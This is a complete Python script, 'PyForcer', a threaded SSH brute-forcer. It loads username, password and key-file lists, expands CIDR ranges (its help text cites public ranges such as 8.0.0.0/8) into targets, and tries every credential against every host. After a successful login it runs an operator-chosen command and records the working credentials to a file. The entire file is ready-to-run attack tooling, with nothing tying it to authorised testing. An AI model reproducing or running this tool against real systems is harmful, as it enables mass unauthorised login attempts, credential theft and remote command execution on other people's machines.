#!/usr/bin/env python3
import argparse
import ipaddress
import os
import threading
import concurrent.futures
import sys
import paramiko
import logging
import time
import socket
from dataclasses import dataclass
from typing import Optional, List, Set, Tuple
from contextlib import contextmanager
import queue
import signal

@dataclass
class Credential:
    username: str
    password: str
    keyfile: Optional[str] = None

@dataclass(frozen=True, eq=True)
class Target:
    ip: str
    port: int

    def __hash__(self):
        return hash((self.ip, self.port))

class ConnectionPool:
    def __init__(self, size: int = 100):
        self.pool = queue.Queue(maxsize=size)
        self.size = size

    def get_client(self) -> paramiko.SSHClient:
        try:
            return self.pool.get_nowait()
        except queue.Empty:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            return ssh

    def return_client(self, client: paramiko.SSHClient):
        try:
            self.pool.put_nowait(client)
        except queue.Full:
            client.close()

@contextmanager
def ssh_client_from_pool(pool: ConnectionPool):
    client = pool.get_client()
    try:
        yield client
    finally:
        try:
            client.close()
        except Exception:
            pass
        pool.return_client(client)

class RateLimiter:
    def __init__(self, max_attempts: int, time_window: int):
        self.max_attempts = max_attempts
        self.time_window = time_window
        self.attempts = {}
        self.lock = threading.Lock()

    def can_attempt(self, ip: str) -> bool:
        with self.lock:
            now = time.time()
            if ip in self.attempts:
                attempts = [t for t in self.attempts[ip] if now - t < self.time_window]
                self.attempts[ip] = attempts
                if len(attempts) >= self.max_attempts:
                    return False
            else:
                attempts = []
            self.attempts[ip] = attempts + [now]
            return True

class PyForcer:
    def __init__(self, debug: bool = False):
        self.print_lock = threading.Lock()
        self.file_write_lock = threading.Lock()
        self.connection_pool = ConnectionPool()
        self.rate_limiter = RateLimiter(max_attempts=5, time_window=60)
        self.timeout = 10
        self.debug = debug
        self.stop_event = threading.Event()

        if debug:
            logging.basicConfig(
                level=logging.DEBUG,
                format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            )
        else:
            paramiko.util.log_to_file('/dev/null')
        
        self.logger = logging.getLogger(__name__)

    def safe_print(self, message: str):
        with self.print_lock:
            print(message)

    def safe_write(self, file: str, content: str):
        with self.file_write_lock:
            with open(file, 'a') as f:
                f.write(f"{content}\n")

    def read_credentials_file(self, credentials_file: str) -> Tuple[List[Credential], int, int]:
        credentials = []
        total_count = 0
        keyfile_count = 0
        
        try:
            with open(credentials_file, "r") as file:
                for line in file:
                    line = line.strip()
                    if ":" in line:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            username = parts[0]
                            password = parts[1]
                            keyfile = parts[2] if len(parts) == 3 else None
                            credentials.append(Credential(username, password, keyfile))
                            if keyfile:
                                keyfile_count += 1
                            total_count += 1
                    else:
                        self.safe_print(f"Malformed line in credentials file: {line}")
        except Exception as e:
            self.logger.error(f"Error reading credentials file: {e}")
            raise

        return credentials, total_count, keyfile_count

    def parse_input_data(self, input_data: str) -> Tuple[Set[Target], int, int]:
        targets = set()
        num_ranges = 0
        total_ip_addresses = 0

        try:
            if input_data.startswith("FILE:"):
                file_path = input_data[len("FILE:"):]
                with open(file_path, 'r') as file:
                    for line in file:
                        line = line.strip()
                        if line:
                            new_targets = self._parse_target_line(line)
                            if '/' in line:
                                num_ranges += 1
                            targets.update(new_targets)
                            
            else:
                data = input_data[len("IP:"):] if input_data.startswith("IP:") else input_data
                new_targets = self._parse_target_line(data)
                if '/' in data:
                    num_ranges += 1
                targets.update(new_targets)

            total_ip_addresses = len(targets)

        except Exception as e:
            self.logger.error(f"Error parsing input data: {e}")
            if self.debug:
                self.logger.exception("Detailed error:")
            raise

        return targets, num_ranges, total_ip_addresses

    def _parse_target_line(self, line: str) -> Set[Target]:
        targets = set()
        if not line:
            return targets

        try:
            if '/' in line:
                cidr, port = line.split(':')
                network = ipaddress.ip_network(cidr, strict=False)
                for ip in network:
                    targets.add(Target(str(ip), int(port)))
            else:
                if ':' not in line:
                    self.logger.error(f"Invalid format - missing port in line: {line}")
                    return targets
                ip, port = line.split(':')
                try:
                    port = int(port)
                    ipaddress.ip_address(ip)
                    targets.add(Target(ip, port))
                except ValueError as e:
                    self.logger.error(f"Invalid IP or port in line: {line} - {str(e)}")
                    return targets

        except Exception as e:
            self.logger.error(f"Error parsing target line '{line}': {e}")
            if self.debug:
                self.logger.exception("Detailed error:")

        return targets
    
    def check_success_condition(self, ssh_client: paramiko.SSHClient, cmd: str) -> Tuple[bool, str]:
        try:
            stdin, stdout, stderr = ssh_client.exec_command(cmd, timeout=self.timeout)
            response = stdout.read().decode("utf-8").strip()
            
            success = False
            if "uname" in cmd:
                if any(platform in response for platform in ["Linux", "Darwin"]):
                    success = True
            elif "whoami" in cmd:
                username = ssh_client.get_transport().get_username()
                if username in response:
                    success = True
                    
            return success, response
        except Exception as e:
            self.logger.error(f"Error executing command: {e}")
            return False, str(e)

    def test_ssh_credentials(self, target: Target, credential: Credential, output: str, 
                           cmd: str, interface: Optional[str] = None):
        if not self.rate_limiter.can_attempt(target.ip):
            self.logger.debug(f"Rate limit reached for {target.ip}")
            return

        if self.stop_event.is_set():
            return

        with ssh_client_from_pool(self.connection_pool) as ssh_client:
            try:
                sock = None
                if interface:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.bind((interface, 0))

                if credential.password:
                    try:
                        ssh_client.connect(
                            target.ip,
                            port=target.port,
                            username=credential.username,
                            password=credential.password,
                            timeout=self.timeout,
                            sock=sock
                        )
                        success, response = self.check_success_condition(ssh_client, cmd)
                        if success:
                            self.safe_print(
                                f"[VALID PASSWORD] {credential.username}:{credential.password} - "
                                f"{target.ip}:{target.port} - [CMD:{cmd}] [RESPONSE:{response}]"
                            )
                            self.safe_write(
                                output,
                                f"[VALID PASSWORD] {credential.username}:{credential.password} - "
                                f"{target.ip}:{target.port} - [CMD:{cmd}] [RESPONSE:{response}]"
                            )
                    except paramiko.AuthenticationException:
                        if self.debug:
                            self.safe_print(
                                f"[FAILED PASSWORD] {credential.username}:{credential.password} - "
                                f"{target.ip}:{target.port}"
                            )

                if credential.keyfile:
                    try:
                        pkey = paramiko.RSAKey.from_private_key_file(credential.keyfile)
                        ssh_client.connect(
                            target.ip,
                            port=target.port,
                            username=credential.username,
                            pkey=pkey,
                            timeout=self.timeout,
                            sock=sock
                        )
                        success, response = self.check_success_condition(ssh_client, cmd)
                        if success:
                            self.safe_print(
                                f"[VALID KEY] {credential.username}:{credential.keyfile} - "
                                f"{target.ip}:{target.port} - [CMD:{cmd}] [RESPONSE:{response}]"
                            )
                            self.safe_write(
                                output,
                                f"[VALID KEY] {credential.username}:{credential.keyfile} - "
                                f"{target.ip}:{target.port} - [CMD:{cmd}] [RESPONSE:{response}]"
                            )
                    except paramiko.AuthenticationException:
                        if self.debug:
                            self.safe_print(
                                f"[FAILED KEY] {credential.username}:{credential.keyfile} - "
                                f"{target.ip}:{target.port}"
                            )

            except (socket.timeout, socket.error) as e:
                if self.debug:
                    self.logger.error(f"Network error for {target.ip}:{target.port}: {e}")
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Unexpected error for {target.ip}:{target.port}: {e}")

    def signal_handler(self, signum, frame):
        self.safe_print("\nReceived signal to stop. Cleaning up...")
        self.stop_event.set()

    def run(self, args):
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        try:
            if not os.path.isfile(args.creds):
                self.safe_print("ERROR: specified credentials file does not exist.")
                return

            credentials, count, keyfile_count = self.read_credentials_file(args.creds)
            targets, num_ranges, total_ip_addresses = self.parse_input_data(args.input)

            self.safe_print("PyForcer - SSH bruteforcing started.")
            self.safe_print(f"\tCredentials loaded: {count} total, {keyfile_count} with keyfiles")
            self.safe_print(f"\tTargets loaded: {len(targets)} total")
            self.safe_print(f"\tOutput File: {args.output}")
            self.safe_print(f"\tCommand To Run: {args.cmd}")
            self.safe_print(f"\tConcurrent Threads: {args.threads}\n")

            with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = []
                for target in targets:
                    for credential in credentials:
                        if self.stop_event.is_set():
                            break
                        futures.append(
                            executor.submit(
                                self.test_ssh_credentials,
                                target,
                                credential,
                                args.output,
                                args.cmd,
                                args.interface
                            )
                        )

                concurrent.futures.wait(
                    futures,
                    timeout=None,
                    return_when=concurrent.futures.ALL_COMPLETED
                )

        except Exception as e:
            self.logger.error(f"Error in main execution: {e}")
            raise

def main():
    parser = argparse.ArgumentParser(
        description="PyForcer - Enhanced SSH Testing Tool"
    )
    parser.add_argument(
        "input",
        help="Target hosts to test, [ex: filename, 8.0.0.0/8, 8.8.8.8]"
    )
    parser.add_argument(
        "output",
        help="Path to the output file"
    )
    parser.add_argument(
        "creds",
        default="credentials.txt",
        help="Path to a file containing USER:PASS:KEYFILE combinations (KEYFILE optional)"
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=32,
        choices=range(1, 101),
        help="Number of threads (1-100, default: 32)"
    )
    parser.add_argument(
        "--interface",
        default=None,
        help="Network interface to use"
    )
    parser.add_argument(
        "--cmd",
        default="uname -a",
        help="Command to run after successful login"
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Enable debugging output"
    )

    args = parser.parse_args()
    
    pyforcer = PyForcer(debug=args.debug)
    pyforcer.run(args)

if __name__ == "__main__":
    main()